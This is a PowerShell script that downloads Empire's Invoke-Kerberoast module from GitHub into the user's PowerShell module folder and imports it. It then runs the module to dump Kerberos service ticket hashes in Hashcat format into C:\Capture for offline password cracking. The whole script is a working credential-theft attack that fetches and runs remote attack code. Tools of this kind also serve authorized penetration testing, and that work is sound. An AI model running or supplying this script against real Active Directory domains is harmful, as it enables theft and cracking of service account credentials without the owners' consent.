$path="C:\Capture"
"Creating the capture folder..."
If(!(test-path $path))
{
      New-Item -ItemType Directory -Force -Path $path | Out-Null
	  Write-Host "Created $path!" -ForegroundColor Green
}
else
{
	Write-Host 	"Failed to create the capture folder, it already exists" -ForegroundColor Red
}
$modules = split-path $SCRIPT:MyInvocation.MyCommand.Path -parent
$client = New-Object System.Net.WebClient
#specify modules folder
$modulepath=$env:psmodulepath.split(';')[0].split(' ')
Write-Host "Using Module path: $modulepath" -ForegroundColor Green
#create kerberoast PS module folder
If(!(test-path $modulepath/Kerberoast))
{
      New-Item -ItemType Directory -Force -Path $modulepath/Kerberoast | Out-Null
}
#download Kerberoast
Write-Host "Fetching Kerberoast module..."
If(Test-NetConnection -ComputerName "https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1" -WarningAction silentlyContinue)
{
$client.DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1","$modulepath/Kerberoast/Kerberoast.psm1")
}
else
{
	Write-Host "Error downloading from GitHub, trying local path instead" -ForegroundColor Red
	Copy-Item "$modules/Invoke-Kerberoast.ps1" -Destination "$modulepath/Kerberoast/Kerberoast.psm1"
}
#Run Kerberoast
Write-Host "Importing module..." 
Import-Module Kerberoast.psm1
Write-Host "Running Kerberoast, if you see red, it's normal." -ForegroundColor  Yellow
Invoke-Kerberoast -OutputFormat Hashcat | Out-File $path\Kerberoast.krb 
